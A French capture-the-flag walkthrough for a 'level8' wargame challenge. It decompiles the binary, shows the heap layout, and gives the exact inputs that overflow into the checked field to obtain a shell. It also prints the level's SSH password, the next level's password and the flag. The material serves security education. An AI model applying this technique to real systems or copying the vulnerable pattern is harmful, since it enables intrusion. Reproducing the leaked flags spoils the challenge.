# Level8 - Walkthrough

## Objectif
Exploiter un heap overflow via allocation contiguë pour modifier la zone mémoire vérifiée par la commande `login` et obtenir un shell.

---

## Étape 1 : Connexion
```bash
ssh level8@localhost -p 4242
# Mot de passe : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

---

## Étape 2 : Reconnaissance
```bash
ls -la
./level8
# (nil), (nil)
```

Le programme affiche deux pointeurs et attend des commandes en input.

Tester les commandes :
```bash
auth
service
reset
login
```

---

## Étape 3 : Identifier la vulnérabilité

Analyser le binaire dans Ghidra révèle :
```c
char *auth = NULL;
char *service = NULL;

int main(void) {
    char buffer[128];
    
    while (1) {
        printf("%p, %p \n", auth, service);
        
        if (fgets(buffer, 128, stdin) == NULL)
            return 0;
        
        // Commande "auth "
        if (strncmp(buffer, "auth ", 5) == 0) {
            auth = malloc(4);              // Alloue seulement 4 bytes
            auth[0] = 0;
            if (strlen(buffer + 5) < 30) {
                strcpy(auth, buffer + 5);
            }
        }
        
        // Commande "reset"
        if (strncmp(buffer, "reset", 5) == 0) {
            free(auth);
        }
        
        // Commande "service"
        if (strncmp(buffer, "service", 7) == 0) {
            service = strdup(buffer + 8);  // Alloue après auth
        }
        
        // Commande "login"
        if (strncmp(buffer, "login", 5) == 0) {
            if (*(int *)(auth + 32) == 0) {      // Vérifie auth[32] !
                fwrite("Password:\n", 1, 10, stdout);
            } else {
                system("/bin/sh");               // Shell si != 0
            }
        }
    }
}
```

**La vulnérabilité :**
- `malloc(4)` alloue seulement 4 bytes pour `auth`
- `login` vérifie `auth[32]` (32 bytes après le début de `auth`)
- Accès **hors limites** de la zone allouée

---

## Étape 4 : Analyser l'allocation heap

Tester les commandes et observer les adresses :
```bash
./level8
(nil), (nil)
auth test
0x804a008, (nil)
service AAAA
0x804a008, 0x804a018
```

**Layout de la heap :**
```
0x804a008: [auth - 4 bytes]     ← malloc(4)
0x804a00c: [heap metadata]      ← ~12 bytes
0x804a018: [service - N bytes]  ← strdup(input)
...
0x804a028: [???]                ← auth + 32 (zone vérifiée par login)
```

**Distance à couvrir :** `0x804a028 - 0x804a018 = 0x10 = 16 bytes`

---

## Étape 5 : Construction de l'exploit

**Stratégie :**
1. Allouer `auth` avec la commande `auth`
2. Allouer `service` juste après avec au moins 16 caractères
3. Les données de `service` débordent jusqu'à `auth + 32`
4. La commande `login` vérifie `auth[32]` qui n'est plus nul → shell obtenu

---

## Étape 6 : Exploitation
```bash
./level8
auth test
service AAAAAAAAAAAAAAAA
login
```

Résultat : Shell obtenu !
```bash
cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
```bash
su level9
# Mot de passe : c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

---

## Flag
```
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

---

## Type de vulnérabilité

- **Heap overflow** : Débordement via allocation adjacente
- **Out-of-bounds read** : Lecture hors limites (`auth[32]` alors que `malloc(4)`)

La heap alloue la mémoire de manière contiguë. En remplissant `service` avec suffisamment de données, on écrit dans la zone que `login` vérifie, permettant de bypasser la vérification.